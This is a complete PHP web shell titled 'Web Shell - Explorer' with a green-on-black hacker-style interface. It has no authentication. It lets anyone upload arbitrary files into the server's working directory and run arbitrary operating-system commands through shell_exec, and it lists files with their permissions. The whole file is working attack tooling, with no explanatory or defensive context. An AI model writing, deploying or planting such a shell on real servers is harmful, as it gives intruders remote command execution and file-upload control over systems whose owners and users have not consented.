<?php
    $current_dir = getcwd();

    // File Upload Logic
    $msg = "";
    if (isset($_FILES['fileToUpload'])) {
        $target_path = $current_dir . DIRECTORY_SEPARATOR . basename($_FILES['fileToUpload']['name']);
        if (move_uploaded_file($_FILES['fileToUpload']['tmp_name'], $target_path)) {
            $msg = "Uploaded: " . htmlspecialchars(basename($_FILES['fileToUpload']['name']));
        }
    }

    // Command Execution Logic
    $cmd_output = "";
    if (isset($_POST['cmd'])) {
        $cmd_output = shell_exec($_POST['cmd'] . " 2>&1");
    }

    // Directory Listing Logic
    $files = scandir($current_dir);
?>
<!DOCTYPE html>
<html>
<head>
    <title>Web Shell - Explorer</title>
    <style>
        body { background: #1a1a1a; color: #00ff00; font-family: monospace; padding: 20px; }
        input, button { background: #333; color: #00ff00; border: 1px solid #00ff00; padding: 5px; }
        pre { background: #000; padding: 10px; border: 1px solid #444; overflow-x: auto; }
        .dir { color: #5dade2; font-weight: bold; }      /* Blue for Directories */
        .exe { color: #ec7063; font-weight: bold; }      /* Red for Executables */
        .file { color: #fdfefe; }                         /* White for Regular Files */
        .msg { color: #f4d03f; margin-bottom: 10px; }
        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
        th, td { text-align: left; padding: 8px; border-bottom: 1px solid #333; }
    </style>
</head>
<body>
    <h2>Path: <?php echo $current_dir; ?></h2>
    
    <?php if($msg) echo "<div class='msg'>$msg</div>"; ?>

    <form method="POST" enctype="multipart/form-data">
        <input type="file" name="fileToUpload">
        <button type="submit">Upload</button>
    </form>

    <form method="POST" style="margin-top:10px;">
        <input type="text" name="cmd" placeholder="Execute command..." style="width:400px;">
        <button type="submit">Run</button>
    </form>

    <?php if ($cmd_output): ?>
        <pre><?php echo htmlspecialchars($cmd_output); ?></pre>
    <?php endif; ?>

    <table>
        <tr><th>Name</th><th>Size</th><th>Perms</th></tr>
        <?php
        foreach ($files as $file) {
            if ($file == "." || $file == "..") continue;
            
            $full_path = $current_dir . DIRECTORY_SEPARATOR . $file;
            $class = "file";
            $perms = substr(sprintf('%o', fileperms($full_path)), -4);
            $is_exec = is_executable($full_path);
            
            if (is_dir($full_path)) {
                $class = "dir";
                $file = "[DIR] $file";
            } elseif ($is_exec) {
                $class = "exe";
                $file = "[EXE] $file";
            }

            echo "<tr>
                    <td class='$class'>" . htmlspecialchars($file) . "</td>
                    <td>" . filesize($full_path) . " B</td>
                    <td>$perms</td>
                  </tr>";
        }
        ?>
    </table>
</body>
</html>
